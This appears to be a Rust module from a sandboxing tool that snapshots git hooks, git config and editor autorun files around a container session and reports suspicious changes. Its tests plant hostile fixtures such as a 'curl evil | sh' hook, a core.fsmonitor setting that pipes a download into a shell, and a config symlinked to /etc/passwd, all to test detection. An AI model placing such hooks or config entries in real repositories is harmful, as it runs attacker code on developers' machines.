//! The session report. Code in the container can write anything in the
//! project, and some of what it writes is acted on by the host later: git
//! runs hooks, and its config can name programs to run (`core.fsmonitor`,
//! `core.pager`, filters, ...), the next time you use git there. podbay
//! records those files before a session and reports what changed after it,
//! so you know before running git on the host.
//!
//! Two mechanisms:
//! - The project's own git directory is snapshotted by content, so the
//!   report can show what changed, setting by setting.
//! - The rest of the tree is scanned for nested repositories (a `.git` in a
//!   subdirectory shadows the project's when you run git there) and a few
//!   files editors and shells act on. These are flagged when their status
//!   change time (ctime) falls inside the session. ctime is set by the
//!   kernel and cannot be backdated from inside the container.
//!
//! Everything read here may have been written by the container. Symlinks are
//! recorded, never followed; only regular files are opened; and every string
//! is escaped before it reaches the terminal.

use std::collections::BTreeMap;
use std::fs::{self, Metadata};
use std::io::{self, Read};
use std::os::unix::fs::{MetadataExt, OpenOptionsExt, PermissionsExt};
use std::path::{Component, Path, PathBuf};
use std::time::{Duration, SystemTime};

use sha2::{Digest, Sha256};

use crate::gitconfig;

/// Files larger than this are compared by size and ctime instead of content.
const MAX_HASHED: u64 = 64 << 20;
/// Files up to this size are kept as text for showing diffs.
const MAX_TEXT: u64 = 256 << 10;
/// The tree scan gives up after this many directory entries.
const SCAN_LIMIT: usize = 500_000;
/// Hook directories with more entries than this are not listed in full.
const MAX_HOOKS: usize = 1_000;
/// ctime granularity and clock slack: changes this long before the session
/// started still count as during it.
const SLACK: Duration = Duration::from_secs(2);

/// Files in the working tree that tools on the host act on, and how.
const AUTORUN: &[(&str, &str)] = &[
    (".envrc", "direnv runs it in your shell once allowed"),
    (
        ".vscode/settings.json",
        "VS Code applies it to the workspace",
    ),
    (".vscode/tasks.json", "VS Code can run its tasks"),
    (".vscode/launch.json", "VS Code can run its launch commands"),
    (
        ".devcontainer.json",
        "dev container tools run commands from it",
    ),
    (
        ".devcontainer/devcontainer.json",
        "dev container tools run commands from it",
    ),
    (
        "mise.toml",
        "mise on the host runs its hooks and tasks once trusted",
    ),
    (
        ".mise.toml",
        "mise on the host runs its hooks and tasks once trusted",
    ),
    (
        "mise.local.toml",
        "mise on the host runs its hooks and tasks once trusted",
    ),
    (
        ".config/mise.toml",
        "mise on the host runs its hooks and tasks once trusted",
    ),
    (
        ".mise/config.toml",
        "mise on the host runs its hooks and tasks once trusted",
    ),
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Notice,
    Warning,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    pub severity: Severity,
    /// Project-relative path, already escaped for display.
    pub path: String,
    pub what: String,
    /// Extra lines, such as changed settings; already escaped.
    pub details: Vec<String>,
}

/// What a watched path is to git.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Role {
    /// The `.git` entry at the top of the project.
    GitLink,
    HooksDir,
    Hook,
    Config,
    Attributes,
    /// `commondir`, which redirects where git finds config and hooks.
    Pointer,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Entry {
    Missing,
    File {
        digest: String,
        executable: bool,
        text: Option<String>,
    },
    Dir,
    Symlink(String),
    Special(&'static str),
    /// A directory on the way to it is a symlink, so it was not looked at.
    BehindSymlink,
    Unreadable(String),
}

/// A session in progress: what the project looked like when it started.
pub struct Watch {
    project: PathBuf,
    since: SystemTime,
    targets: BTreeMap<PathBuf, Role>,
    before: BTreeMap<PathBuf, Entry>,
    rw_files: Vec<PathBuf>,
}

impl Watch {
    /// Snapshots `project` before the container starts. `rw_mounts` are host
    /// paths mounted read-write; regular files among them are checked too.
    pub fn begin(project: &Path, rw_mounts: &[PathBuf]) -> Self {
        let since = SystemTime::now() - SLACK;
        let targets = discover(project);
        let before = snapshot(project, &targets);
        let rw_files = rw_mounts
            .iter()
            .filter(|p| fs::symlink_metadata(p).is_ok_and(|m| m.is_file()))
            .cloned()
            .collect();
        Self {
            project: project.to_owned(),
            since,
            targets,
            before,
            rw_files,
        }
    }

    /// Compares the project with its snapshot after the container exited.
    pub fn finish(self) -> Report {
        let mut targets = self.targets;
        targets.extend(discover(&self.project));
        let after = snapshot(&self.project, &targets);

        let mut findings = Vec::new();
        for (path, role) in &targets {
            let before = self.before.get(path).unwrap_or(&Entry::Missing);
            let after = after.get(path).unwrap_or(&Entry::Missing);
            if before != after {
                findings.push(change(path, *role, before, after));
            }
        }
        findings.extend(scan(&self.project, self.since));
        for file in &self.rw_files {
            if changed_since(file, self.since) {
                findings.push(Finding {
                    severity: Severity::Warning,
                    path: printable(&file.to_string_lossy()),
                    what: "changed during the session (a read-write mount from your profile)"
                        .into(),
                    details: vec![],
                });
            }
        }
        Report { findings }
    }
}

#[derive(Debug)]
pub struct Report {
    pub findings: Vec<Finding>,
}

impl Report {
    pub fn render(&self, project: &Path) -> String {
        if self.findings.is_empty() {
            return "podbay: session report: no changes to git hooks or config\n".into();
        }
        let count = |s| self.findings.iter().filter(|f| f.severity == s).count();
        let plural = |n: usize, word: &str| match n {
            1 => format!("1 {word}"),
            n => format!("{n} {word}s"),
        };
        let mut out = format!(
            "podbay: session report: {}, {}\n",
            plural(count(Severity::Warning), "warning"),
            plural(count(Severity::Notice), "notice"),
        );
        let mut findings: Vec<&Finding> = self.findings.iter().collect();
        findings.sort_by_key(|f| std::cmp::Reverse(f.severity));
        for f in findings {
            let label = match f.severity {
                Severity::Warning => "warning:",
                Severity::Notice => "notice: ",
            };
            out.push_str(&format!("  {label} {}: {}\n", f.path, f.what));
            for line in &f.details {
                out.push_str(&format!("            {line}\n"));
            }
        }
        if count(Severity::Warning) > 0 {
            out.push_str(&format!(
                "podbay: git and other tools on the host act on these files. Inspect them \
                 before running git in {}\n",
                printable(&project.to_string_lossy())
            ));
        }
        out
    }
}

/// The paths to snapshot: the `.git` entry and, if it leads to a git
/// directory inside the project, that directory's config, hooks and what
/// they point to.
fn discover(project: &Path) -> BTreeMap<PathBuf, Role> {
    let mut targets = BTreeMap::new();
    let link = PathBuf::from(".git");
    targets.insert(link.clone(), Role::GitLink);
    let gitdir = match inspect(project, &link) {
        Entry::Dir => Some(link),
        Entry::File {
            text: Some(text), ..
        } => text
            .strip_prefix("gitdir:")
            .and_then(|dir| within(project, Path::new(""), dir.trim())),
        _ => None,
    };
    if let Some(gitdir) = gitdir {
        add_gitdir(project, &gitdir, &mut targets, 0);
    }
    targets
}

fn add_gitdir(project: &Path, dir: &Path, targets: &mut BTreeMap<PathBuf, Role>, depth: u32) {
    if depth > 8 {
        return;
    }
    for (name, role) in [
        ("config", Role::Config),
        ("config.worktree", Role::Config),
        ("info/attributes", Role::Attributes),
        ("commondir", Role::Pointer),
    ] {
        targets.insert(dir.join(name), role);
    }
    add_hooks(project, &dir.join("hooks"), targets);

    for config in ["config", "config.worktree"] {
        add_config_refs(project, &dir.join(config), targets, 0);
    }

    if let Some(common) = text_of(project, &dir.join("commondir"))
        && let Some(common) = within(project, dir, common.trim())
        && common != dir
    {
        add_gitdir(project, &common, targets, depth + 1);
    }

    // Submodules keep their git directories here, possibly nested by path.
    add_modules(project, &dir.join("modules"), targets, depth + 1);

    // Linked worktrees can each have their own config.
    for child in children(project, &dir.join("worktrees")) {
        targets.insert(child.join("config.worktree"), Role::Config);
    }
}

fn add_modules(project: &Path, dir: &Path, targets: &mut BTreeMap<PathBuf, Role>, depth: u32) {
    if depth > 8 {
        return;
    }
    for child in children(project, dir) {
        if matches!(inspect(project, &child.join("HEAD")), Entry::File { .. }) {
            add_gitdir(project, &child, targets, depth + 1);
        } else if inspect(project, &child) == Entry::Dir {
            add_modules(project, &child, targets, depth + 1);
        }
    }
}

fn add_hooks(project: &Path, dir: &Path, targets: &mut BTreeMap<PathBuf, Role>) {
    targets.insert(dir.to_owned(), Role::HooksDir);
    for hook in children(project, dir).into_iter().take(MAX_HOOKS) {
        targets.insert(hook, Role::Hook);
    }
}

/// Follows `core.hooksPath` and includes in a config file to the files they
/// name inside the project. Outside the project the container cannot reach
/// them, and a change to the setting itself is reported anyway.
fn add_config_refs(
    project: &Path,
    config: &Path,
    targets: &mut BTreeMap<PathBuf, Role>,
    depth: u32,
) {
    if depth > 4 {
        return;
    }
    let Some(settings) = text_of(project, config).and_then(|t| gitconfig::parse(&t).ok()) else {
        return;
    };
    let config_dir = config.parent().unwrap_or(Path::new(""));
    for (name, value) in settings {
        let include =
            name == "include.path" || (name.starts_with("includeif.") && name.ends_with(".path"));
        if name == "core.hookspath" {
            // Relative to the top of the working tree.
            if let Some(dir) = within(project, Path::new(""), &value) {
                add_hooks(project, &dir, targets);
            }
        } else if include && let Some(file) = within(project, config_dir, &value) {
            targets.insert(file.clone(), Role::Config);
            add_config_refs(project, &file, targets, depth + 1);
        }
    }
}

/// Resolves `path` (absolute, or relative to `base`) to a project-relative
/// path, lexically. `None` if it leads outside the project.
fn within(project: &Path, base: &Path, path: &str) -> Option<PathBuf> {
    if path.is_empty() || path.starts_with('~') {
        return None;
    }
    let path = Path::new(path);
    let joined = match path.strip_prefix(project) {
        Ok(rest) => rest.to_owned(),
        Err(_) if path.is_absolute() => return None,
        Err(_) => base.join(path),
    };
    let mut out = PathBuf::new();
    for component in joined.components() {
        match component {
            Component::Normal(c) => out.push(c),
            Component::CurDir => {}
            Component::ParentDir => {
                if !out.pop() {
                    return None;
                }
            }
            Component::RootDir | Component::Prefix(_) => return None,
        }
    }
    Some(out)
}

fn snapshot(project: &Path, targets: &BTreeMap<PathBuf, Role>) -> BTreeMap<PathBuf, Entry> {
    targets
        .keys()
        .map(|path| (path.clone(), inspect(project, path)))
        .collect()
}

/// Looks at `project/rel` without following symlinks, including in the
/// directories on the way to it.
fn inspect(project: &Path, rel: &Path) -> Entry {
    let mut at = project.to_owned();
    let mut components = rel.components().peekable();
    while let Some(component) = components.next() {
        at.push(component);
        let meta = match fs::symlink_metadata(&at) {
            Ok(meta) => meta,
            Err(e) if e.kind() == io::ErrorKind::NotFound => return Entry::Missing,
            Err(e) => return Entry::Unreadable(e.to_string()),
        };
        if components.peek().is_some() {
            if meta.is_symlink() {
                return Entry::BehindSymlink;
            }
            if !meta.is_dir() {
                return Entry::Missing;
            }
            continue;
        }
        return entry(&at, &meta);
    }
    Entry::Dir
}

fn entry(path: &Path, meta: &Metadata) -> Entry {
    let kind = meta.file_type();
    if kind.is_dir() {
        Entry::Dir
    } else if kind.is_symlink() {
        match fs::read_link(path) {
            Ok(target) => Entry::Symlink(target.to_string_lossy().into_owned()),
            Err(e) => Entry::Unreadable(e.to_string()),
        }
    } else if kind.is_file() {
        let executable = meta.permissions().mode() & 0o111 != 0;
        match read_file(path, meta) {
            Ok((digest, text)) => Entry::File {
                digest,
                executable,
                text,
            },
            Err(e) => Entry::Unreadable(e.to_string()),
        }
    } else {
        use std::os::unix::fs::FileTypeExt;
        Entry::Special(if kind.is_fifo() {
            "a fifo"
        } else if kind.is_socket() {
            "a socket"
        } else {
            "a device"
        })
    }
}

fn read_file(path: &Path, meta: &Metadata) -> io::Result<(String, Option<String>)> {
    if meta.len() > MAX_HASHED {
        let digest = format!(
            "large:{}:{}.{}",
            meta.len(),
            meta.ctime(),
            meta.ctime_nsec()
        );
        return Ok((digest, None));
    }
    // O_NOFOLLOW and O_NONBLOCK in case it was swapped for a symlink or a
    // fifo since it was looked at.
    let mut file = fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK)
        .open(path)?;
    let mut data = Vec::new();
    file.by_ref().take(MAX_HASHED).read_to_end(&mut data)?;
    let digest = hex(&Sha256::digest(&data));
    let text = (data.len() as u64 <= MAX_TEXT)
        .then(|| String::from_utf8(data).ok())
        .flatten();
    Ok((digest, text))
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

fn text_of(project: &Path, rel: &Path) -> Option<String> {
    match inspect(project, rel) {
        Entry::File { text, .. } => text,
        _ => None,
    }
}

/// Entries of a directory inside the project, if it is a real directory.
fn children(project: &Path, dir: &Path) -> Vec<PathBuf> {
    if inspect(project, dir) != Entry::Dir {
        return Vec::new();
    }
    let Ok(entries) = fs::read_dir(project.join(dir)) else {
        return Vec::new();
    };
    let mut out: Vec<PathBuf> = entries.flatten().map(|e| dir.join(e.file_name())).collect();
    out.sort();
    out
}

fn change(path: &Path, role: Role, before: &Entry, after: &Entry) -> Finding {
    let display = printable(&path.to_string_lossy());
    let name = path.file_name().unwrap_or_default().to_string_lossy();
    let mut finding = Finding {
        severity: Severity::Warning,
        path: display,
        what: transition(before, after),
        details: vec![],
    };
    match role {
        Role::Hook => {
            let runnable = match after {
                Entry::File { executable, .. } => *executable,
                Entry::Missing => false,
                _ => true,
            };
            if name.ends_with(".sample") {
                finding.severity = Severity::Notice;
                finding.what.push_str(" (git ignores .sample hooks)");
            } else if !runnable {
                finding.severity = Severity::Notice;
                if *after != Entry::Missing {
                    finding
                        .what
                        .push_str(" (not executable, so git does not run it yet)");
                }
            }
        }
        Role::Config => {
            if is_file(after) {
                match settings_diff(before, after) {
                    Ok(details) if details.is_empty() => {
                        finding.what =
                            "changed, but no setting podbay can read differs; inspect it".into();
                    }
                    Ok(details) => {
                        finding.what = match before {
                            Entry::Missing => "added".into(),
                            _ => "settings changed".into(),
                        };
                        finding.details = details;
                    }
                    Err(why) => {
                        finding.what.push_str(&format!(
                            "; podbay could not read its settings ({}), inspect it",
                            printable(&why)
                        ));
                    }
                }
            }
        }
        Role::GitLink => {
            if let (
                Entry::File {
                    text: Some(old), ..
                },
                Entry::File {
                    text: Some(new), ..
                },
            ) = (before, after)
            {
                finding.what = "now points somewhere else".into();
                finding.details = vec![
                    format!("- {}", printable(old.trim())),
                    format!("+ {}", printable(new.trim())),
                ];
            }
        }
        Role::Attributes => {
            finding.severity = Severity::Notice;
            finding
                .what
                .push_str(" (can switch on filters and diff drivers your git config defines)");
        }
        Role::HooksDir | Role::Pointer => {}
    }
    finding
}

fn is_file(e: &Entry) -> bool {
    matches!(e, Entry::File { .. })
}

fn transition(before: &Entry, after: &Entry) -> String {
    match (before, after) {
        (Entry::Missing, after) => format!("added, {}", describe(after)),
        (_, Entry::Missing) => "removed".into(),
        (Entry::File { .. }, Entry::File { .. }) => "changed".into(),
        (before, after) => format!("was {}, now {}", describe(before), describe(after)),
    }
}

fn describe(e: &Entry) -> String {
    match e {
        Entry::Missing => "missing".into(),
        Entry::File {
            executable: true, ..
        } => "an executable file".into(),
        Entry::File { .. } => "a file".into(),
        Entry::Dir => "a directory".into(),
        Entry::Symlink(target) => format!("a symlink to {}", printable(target)),
        Entry::Special(kind) => (*kind).into(),
        Entry::BehindSymlink => "behind a symlink (not followed)".into(),
        Entry::Unreadable(err) => format!("unreadable ({})", printable(err)),
    }
}

/// Lines of `- name = value` / `+ name = value`, or why either side could
/// not be read.
fn settings_diff(before: &Entry, after: &Entry) -> Result<Vec<String>, String> {
    let settings = |e: &Entry| match e {
        Entry::Missing => Ok(Vec::new()),
        Entry::File { text: Some(t), .. } => gitconfig::parse(t),
        Entry::File { .. } => Err("not text, or too large".into()),
        other => Err(format!("it was {}", describe(other))),
    };
    let (old, new) = (settings(before)?, settings(after)?);
    let mut lines = Vec::new();
    let mut remaining = new.clone();
    for setting in &old {
        match remaining.iter().position(|s| s == setting) {
            Some(i) => {
                remaining.remove(i);
            }
            None => lines.push(setting_line('-', setting)),
        }
    }
    let mut remaining = old;
    for setting in &new {
        match remaining.iter().position(|s| s == setting) {
            Some(i) => {
                remaining.remove(i);
            }
            None => lines.push(setting_line('+', setting)),
        }
    }
    Ok(lines)
}

fn setting_line(sign: char, (name, value): &(String, String)) -> String {
    let mut line = format!("{sign} {} = {}", printable(name), printable(value));
    if gitconfig::runs_commands(name, value) {
        line.push_str("   [can run commands]");
    }
    line
}

/// Walks the working tree for nested repositories and checks the files
/// tools on the host act on, flagging anything whose ctime is after `since`.
fn scan(project: &Path, since: SystemTime) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut stack = vec![PathBuf::new()];
    let mut seen = 0;
    while let Some(rel) = stack.pop() {
        let dir = project.join(&rel);
        let entries = match fs::read_dir(&dir) {
            Ok(entries) => entries,
            Err(e) => {
                if changed_since(&dir, since) {
                    findings.push(Finding {
                        severity: Severity::Warning,
                        path: printable(&rel.to_string_lossy()),
                        what: format!(
                            "could not be scanned for nested repositories ({})",
                            printable(&e.to_string())
                        ),
                        details: vec![],
                    });
                }
                continue;
            }
        };
        for entry in entries.flatten() {
            seen += 1;
            if seen > SCAN_LIMIT {
                findings.push(Finding {
                    severity: Severity::Notice,
                    path: ".".into(),
                    what: format!(
                        "stopped scanning for nested repositories after {SCAN_LIMIT} entries"
                    ),
                    details: vec![],
                });
                return findings;
            }
            let name = entry.file_name();
            let child = rel.join(&name);
            if name == ".git" {
                // The project's own .git is covered by the snapshot.
                if !rel.as_os_str().is_empty() {
                    findings.extend(nested(project, &child, since));
                }
                continue;
            }
            if entry.file_type().is_ok_and(|t| t.is_dir()) {
                stack.push(child);
            }
        }
    }

    for (rel, why) in AUTORUN {
        if changed_since(&project.join(rel), since) {
            findings.push(Finding {
                severity: Severity::Notice,
                path: (*rel).into(),
                what: format!("changed during the session ({why})"),
                details: vec![],
            });
        }
    }
    findings
}

/// Checks a `.git` found below the top of the project.
fn nested(project: &Path, rel: &Path, since: SystemTime) -> Option<Finding> {
    let path = project.join(rel);
    let meta = fs::symlink_metadata(&path).ok()?;
    let mut changed = Vec::new();
    if meta.is_dir() {
        // The directory's own ctime moves with any git command run in it, so
        // only what git acts on counts.
        if created_since(&meta, since) {
            changed.push(".git itself".to_owned());
        }
        for sub in [
            "config",
            "config.worktree",
            "commondir",
            "info/attributes",
            "hooks",
        ] {
            if changed_since(&path.join(sub), since) {
                changed.push(sub.to_owned());
            }
        }
        let hooks = path.join("hooks");
        if fs::symlink_metadata(&hooks).is_ok_and(|m| m.is_dir())
            && let Ok(entries) = fs::read_dir(&hooks)
        {
            for hook in entries.flatten().take(MAX_HOOKS) {
                if changed_since(&hook.path(), since) {
                    changed.push(format!("hooks/{}", hook.file_name().to_string_lossy()));
                }
            }
        }
    } else if ctime(&meta) >= since {
        changed.push(".git itself".to_owned());
    }
    if changed.is_empty() {
        return None;
    }
    changed.sort();
    changed.dedup();
    let parent = rel.parent().unwrap_or(Path::new(""));
    Some(Finding {
        severity: Severity::Warning,
        path: printable(&rel.to_string_lossy()),
        what: format!(
            "nested repository changed; git run in {}/ uses it instead of the project's",
            printable(&parent.to_string_lossy())
        ),
        details: vec![format!("changed: {}", printable(&changed.join(", ")))],
    })
}

fn changed_since(path: &Path, since: SystemTime) -> bool {
    fs::symlink_metadata(path).is_ok_and(|m| ctime(&m) >= since)
}

fn created_since(meta: &Metadata, since: SystemTime) -> bool {
    // Not every filesystem records birth time; fall back to ctime then.
    meta.created().unwrap_or_else(|_| ctime(meta)) >= since
}

fn ctime(meta: &Metadata) -> SystemTime {
    match (
        u64::try_from(meta.ctime()),
        u32::try_from(meta.ctime_nsec()),
    ) {
        (Ok(secs), Ok(nanos)) => SystemTime::UNIX_EPOCH + Duration::new(secs, nanos),
        _ => SystemTime::UNIX_EPOCH,
    }
}

/// Escapes control characters (including the terminal's escape sequences)
/// and bidirectional overrides, and caps the length, so a string from the
/// container cannot restyle, hide or reorder the report.
pub fn printable(s: &str) -> String {
    const MAX: usize = 200;
    let mut out = String::new();
    for (i, c) in s.chars().enumerate() {
        if i == MAX {
            out.push('…');
            break;
        }
        let bidi = matches!(c, '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' | '\u{200e}' | '\u{200f}');
        if c.is_control() || bidi {
            out.extend(c.escape_default());
        } else {
            out.push(c);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use std::os::unix::fs::symlink;

    use super::*;

    struct Project {
        _dir: tempfile::TempDir,
        root: PathBuf,
    }

    impl Project {
        fn new() -> Self {
            let dir = tempfile::tempdir().unwrap();
            let root = dir.path().join("p");
            fs::create_dir_all(root.join(".git/hooks")).unwrap();
            fs::create_dir_all(root.join(".git/info")).unwrap();
            fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
            fs::write(
                root.join(".git/config"),
                "[core]\n\tbare = false\n[user]\n\tname = me\n",
            )
            .unwrap();
            fs::write(root.join(".git/hooks/pre-commit.sample"), "#!/bin/sh\n").unwrap();
            Self { _dir: dir, root }
        }

        fn write(&self, rel: &str, body: &str) {
            let path = self.root.join(rel);
            fs::create_dir_all(path.parent().unwrap()).unwrap();
            fs::write(path, body).unwrap();
        }

        fn chmod(&self, rel: &str, mode: u32) {
            fs::set_permissions(self.root.join(rel), fs::Permissions::from_mode(mode)).unwrap();
        }

        fn watch(&self) -> Watch {
            Watch::begin(&self.root, &[])
        }
    }

    fn only(report: &Report) -> &Finding {
        assert_eq!(report.findings.len(), 1, "{:#?}", report.findings);
        &report.findings[0]
    }

    #[test]
    fn untouched_project_is_clean() {
        let p = Project::new();
        let report = p.watch().finish();
        assert!(report.findings.is_empty(), "{:#?}", report.findings);
        assert!(report.render(&p.root).contains("no changes"));
    }

    #[test]
    fn not_a_repository_is_clean() {
        let dir = tempfile::tempdir().unwrap();
        let report = Watch::begin(dir.path(), &[]).finish();
        assert!(report.findings.is_empty(), "{:#?}", report.findings);
    }

    #[test]
    fn new_executable_hook_warns() {
        let p = Project::new();
        let watch = p.watch();
        p.write(".git/hooks/post-checkout", "#!/bin/sh\ncurl evil | sh\n");
        p.chmod(".git/hooks/post-checkout", 0o755);
        let report = watch.finish();
        let f = only(&report);
        assert_eq!(f.severity, Severity::Warning);
        assert_eq!(f.path, ".git/hooks/post-checkout");
        assert_eq!(f.what, "added, an executable file");
    }

    #[test]
    fn inert_hooks_are_notices() {
        let p = Project::new();
        let watch = p.watch();
        p.write(".git/hooks/pre-commit.sample", "#!/bin/sh\nevil\n");
        p.write(".git/hooks/pre-push", "#!/bin/sh\nevil\n");
        p.chmod(".git/hooks/pre-push", 0o644);
        let report = watch.finish();
        assert_eq!(report.findings.len(), 2, "{:#?}", report.findings);
        assert!(
            report
                .findings
                .iter()
                .all(|f| f.severity == Severity::Notice)
        );
    }

    #[test]
    fn config_change_lists_settings_and_flags_commands() {
        let p = Project::new();
        let watch = p.watch();
        p.write(
            ".git/config",
            "[core]\n\tbare = false\n\tfsmonitor = \"sh -c 'curl evil | sh'\"\n",
        );
        let report = watch.finish();
        let f = only(&report);
        assert_eq!(f.severity, Severity::Warning);
        assert_eq!(f.what, "settings changed");
        assert_eq!(
            f.details,
            [
                "- user.name = me",
                "+ core.fsmonitor = sh -c 'curl evil | sh'   [can run commands]",
            ]
        );
    }

    #[test]
    fn formatting_only_config_change_still_warns() {
        let p = Project::new();
        let watch = p.watch();
        p.write(
            ".git/config",
            "# hi\n[core]\n\tbare = false\n[user]\n\tname = me\n",
        );
        let f = &watch.finish().findings[0];
        assert_eq!(f.severity, Severity::Warning);
        assert!(f.what.contains("inspect"), "{}", f.what);
    }

    #[test]
    fn unreadable_config_says_why() {
        let p = Project::new();
        let watch = p.watch();
        p.write(".git/config", "[core]\n\tpager = \"open\n");
        let f = only(&watch.finish()).clone();
        assert_eq!(f.severity, Severity::Warning);
        assert!(f.what.contains("unterminated quote"), "{}", f.what);
    }

    #[test]
    fn hooks_dir_replaced_by_symlink() {
        let p = Project::new();
        let watch = p.watch();
        fs::remove_dir_all(p.root.join(".git/hooks")).unwrap();
        symlink("/tmp/elsewhere", p.root.join(".git/hooks")).unwrap();
        let report = watch.finish();
        let dir = report
            .findings
            .iter()
            .find(|f| f.path == ".git/hooks")
            .expect("hooks dir reported");
        assert_eq!(dir.what, "was a directory, now a symlink to /tmp/elsewhere");
        assert_eq!(dir.severity, Severity::Warning);
    }

    #[test]
    fn git_dir_replaced_by_gitlink_into_project() {
        let p = Project::new();
        let watch = p.watch();
        fs::remove_dir_all(p.root.join(".git")).unwrap();
        p.write(".git", "gitdir: shadow\n");
        p.write("shadow/HEAD", "ref: refs/heads/main\n");
        p.write("shadow/config", "[core]\n\tpager = evil\n");
        let report = watch.finish();
        let paths: Vec<&str> = report.findings.iter().map(|f| f.path.as_str()).collect();
        assert!(paths.contains(&".git"), "{paths:?}");
        let config = report
            .findings
            .iter()
            .find(|f| f.path == "shadow/config")
            .expect("followed the new gitdir");
        assert_eq!(config.details, ["+ core.pager = evil   [can run commands]"]);
    }

    #[test]
    fn hooks_path_inside_project_is_watched() {
        let p = Project::new();
        p.write(".git/config", "[core]\n\thooksPath = .husky/_\n");
        p.write(".husky/_/pre-commit", "#!/bin/sh\nnpm test\n");
        p.chmod(".husky/_/pre-commit", 0o755);
        let watch = p.watch();
        p.write(".husky/_/pre-commit", "#!/bin/sh\nevil\n");
        let f = &watch.finish().findings;
        let hook = f.iter().find(|f| f.path == ".husky/_/pre-commit").unwrap();
        assert_eq!(
            (hook.severity, hook.what.as_str()),
            (Severity::Warning, "changed")
        );
    }

    #[test]
    fn included_config_inside_project_is_watched() {
        let p = Project::new();
        p.write(".git/config", "[include]\n\tpath = ../tools/git.cfg\n");
        p.write("tools/git.cfg", "[user]\n\tname = me\n");
        let watch = p.watch();
        p.write("tools/git.cfg", "[core]\n\tsshCommand = evil\n");
        let f = &watch.finish().findings;
        let cfg = f.iter().find(|f| f.path == "tools/git.cfg").unwrap();
        assert!(
            cfg.details.iter().any(|d| d.contains("core.sshcommand")),
            "{cfg:?}"
        );
    }

    #[test]
    fn submodule_hooks_are_watched() {
        let p = Project::new();
        p.write(".git/modules/lib/HEAD", "ref: refs/heads/main\n");
        p.write(".git/modules/lib/config", "");
        fs::create_dir_all(p.root.join(".git/modules/lib/hooks")).unwrap();
        let watch = p.watch();
        p.write(".git/modules/lib/hooks/post-merge", "#!/bin/sh\n");
        p.chmod(".git/modules/lib/hooks/post-merge", 0o755);
        let f = only(&watch.finish()).clone();
        assert_eq!(f.path, ".git/modules/lib/hooks/post-merge");
    }

    #[test]
    fn symlinked_config_is_not_followed() {
        let p = Project::new();
        let watch = p.watch();
        fs::remove_file(p.root.join(".git/config")).unwrap();
        symlink("/etc/passwd", p.root.join(".git/config")).unwrap();
        let f = only(&watch.finish()).clone();
        assert_eq!(f.what, "was a file, now a symlink to /etc/passwd");
    }

    #[test]
    fn fifo_hook_does_not_hang() {
        let p = Project::new();
        let watch = p.watch();
        let fifo = p.root.join(".git/hooks/pre-commit");
        let c = std::ffi::CString::new(fifo.to_str().unwrap()).unwrap();
        // SAFETY: c is a valid NUL-terminated path.
        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o755) }, 0);
        let f = only(&watch.finish()).clone();
        assert_eq!(f.what, "added, a fifo");
    }

    #[test]
    fn scan_flags_nested_repositories_by_ctime() {
        let p = Project::new();
        p.write("vendor/lib/.git/config", "[core]\n\tfsmonitor = evil\n");
        p.write("vendor/lib/src.rs", "");
        p.write("sub/.git", "gitdir: ../elsewhere\n");
        let all = scan(&p.root, SystemTime::UNIX_EPOCH);
        let mut paths: Vec<&str> = all.iter().map(|f| f.path.as_str()).collect();
        paths.sort();
        assert_eq!(paths, ["sub/.git", "vendor/lib/.git"]);
        assert!(all.iter().all(|f| f.severity == Severity::Warning));

        let later = SystemTime::now() + Duration::from_secs(60);
        assert!(scan(&p.root, later).is_empty());
    }

    #[test]
    fn scan_flags_autorun_files() {
        let p = Project::new();
        p.write(".envrc", "evil\n");
        p.write(".vscode/tasks.json", "{}");
        let all = scan(&p.root, SystemTime::UNIX_EPOCH);
        let paths: Vec<&str> = all.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(paths, [".envrc", ".vscode/tasks.json"]);
        assert!(all.iter().all(|f| f.severity == Severity::Notice));
    }

    #[test]
    fn rw_mounted_files_are_checked() {
        let p = Project::new();
        let dir = tempfile::tempdir().unwrap();
        let gitconfig = dir.path().join(".gitconfig");
        fs::write(&gitconfig, "").unwrap();
        let mut watch = Watch::begin(&p.root, &[gitconfig.clone(), dir.path().into()]);
        assert_eq!(watch.rw_files, std::slice::from_ref(&gitconfig));
        watch.since = SystemTime::UNIX_EPOCH;
        let report = watch.finish();
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.path == printable(&gitconfig.to_string_lossy())),
            "{:#?}",
            report.findings
        );
    }

    #[test]
    fn escapes_terminal_sequences_in_output() {
        let p = Project::new();
        let watch = p.watch();
        p.write(".git/config", "[core]\n\tpager = \"x\\n\x1b[2Kfake\"\n");
        let rendered = watch.finish().render(&p.root);
        assert!(!rendered.contains('\x1b'), "{rendered:?}");
        assert!(rendered.contains(r"x\n\u{1b}[2Kfake"), "{rendered}");
    }

    #[test]
    fn printable_escapes_and_truncates() {
        assert_eq!(printable("a\u{202e}b"), r"a\u{202e}b");
        assert_eq!(printable(&"x".repeat(300)).chars().count(), 201);
    }

    #[test]
    fn within_stays_inside() {
        let root = Path::new("/p");
        assert_eq!(within(root, Path::new(".git"), "../x"), Some("x".into()));
        assert_eq!(within(root, Path::new(""), "/p/a/b"), Some("a/b".into()));
        assert_eq!(within(root, Path::new(""), "../x"), None);
        assert_eq!(within(root, Path::new(""), "/etc"), None);
        assert_eq!(within(root, Path::new(""), "~/x"), None);
    }
}
